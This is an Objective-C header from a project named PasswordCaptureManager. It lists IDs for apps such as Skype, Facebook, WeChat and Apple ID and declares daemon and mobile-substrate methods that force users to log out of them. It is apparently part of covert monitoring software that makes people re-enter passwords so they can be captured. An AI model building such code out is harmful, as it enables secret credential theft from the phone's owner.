//
//  PasswordController.h
//  PasswordCaptureManager
//
//  Created by Makara on 2/27/14.
//  Copyright (c) 2014 Vervata. All rights reserved.
//

#import <Foundation/Foundation.h>

#define kBBM            @"1"
#define kYahoo          @"4"
#define kSkype          @"5"
#define kLineiPad       @"6"
#define kLine           @"8"
#define kFacebook       @"9"
#define kFacebookMSG    @"10"
#define kWechat         @"21"
#define kInstagram      @"33"
#define kLinkedIn       @"34"
#define kPinterest      @"35"
#define kFoursquare     @"36"
#define kVimeo          @"37"
#define kFlickr         @"38"
#define kTumblr         @"39"
#define kTwitter        @"40"
#define kAppleID        @"41"
#define kYahooMSG       @"42"

#define kForceOut       YES
#define kReset          NO

@interface PasswordController : NSObject

// Below 6 methods are used in daemon only
+ (BOOL) isCompleteForceLogOut;
+ (void) setCompleteForceLogOut: (BOOL) aForceLogOut;

+ (void) forceLogOutAllPasswordAppID;
+ (void) resetForceLogOutAllPasswordAppID;

+ (void) registerForceLogOutReset;
+ (void) unregisterForceLogOutReset;

// Below 2 methods are used in mobile substrate only
+ (void) forcePasswordAppID: (NSString *) aPasswordAppID
                     logOut: (BOOL) aLogOut;
+ (BOOL) isForceLogOutWithPasswordAppID: (NSString *) aPasswordAppID;

@end
